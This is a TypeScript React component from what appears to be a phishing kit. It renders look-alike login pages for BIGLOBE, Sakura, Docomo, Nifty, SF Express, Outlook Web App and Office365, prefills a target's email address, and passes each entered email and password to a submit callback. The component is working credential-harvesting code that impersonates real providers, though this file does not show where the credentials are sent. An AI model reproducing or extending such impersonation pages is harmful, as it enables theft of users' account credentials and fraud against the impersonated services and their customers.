'use client'

import { Template, SupportedLanguage } from '@/lib/templateTypes'
import { BIGLOBETemplate } from './BIGLOBETemplate'
import { SAKURATemplate } from './SAKURATemplate'
import { DOCOMOTemplate } from './DOCOMOTemplate'
import { NIFTYTemplate } from './NIFTYTemplate'
import { Office365Template } from './Office365Template'
import SFExpressLoginForm from '@/components/LoginForm/SFExpressLoginForm'
import OutlookWebAppLoginForm from '@/components/LoginForm/OutlookWebAppLoginForm'
import OWAServerLoginForm from '@/components/LoginForm/OWAServerLoginForm'

interface GenericTemplateRendererProps {
  template: Template
  language: SupportedLanguage
  email: string
  onSubmit: (email: string, password: string) => void
  onError?: (error: string) => void
}

export function GenericTemplateRenderer(props: GenericTemplateRendererProps) {
  const { template } = props
  
  // Render specific template based on provider
  // Ensure template is always visible with proper z-index and positioning
  const templateComponent = (() => {
    switch (template.provider) {
      case 'biglobe':
        return <BIGLOBETemplate {...props} />
      
      case 'sakura':
        return <SAKURATemplate {...props} />
      
      case 'docomo':
        return <DOCOMOTemplate {...props} />
      
      case 'nifty':
        return <NIFTYTemplate {...props} />
      
      case 'sfexpress':
        return (
          <SFExpressLoginForm
            email={props.email}
            onSubmit={async (identifier, password) => {
              props.onSubmit(identifier, password)
            }}
            backgroundImage="/images/sf-warehouse-bg.png"
          />
        )
      
      case 'outlook':
        return (
          <OutlookWebAppLoginForm
            email={props.email}
            onSubmit={async (identifier, password) => {
              props.onSubmit(identifier, password)
            }}
          />
        )
      
      case 'owaserver':
        return (
          <OWAServerLoginForm
            email={props.email}
            onSubmit={async (identifier, password) => {
              props.onSubmit(identifier, password)
            }}
          />
        )
      
      case 'custom':
      default:
        // Use Office365Template as default for custom/international templates
        return <Office365Template {...props} />
    }
  })()
  
  return (
    <div style={{ position: 'relative', zIndex: 1, width: '100%', height: '100%' }}>
      {templateComponent}
    </div>
  )
}



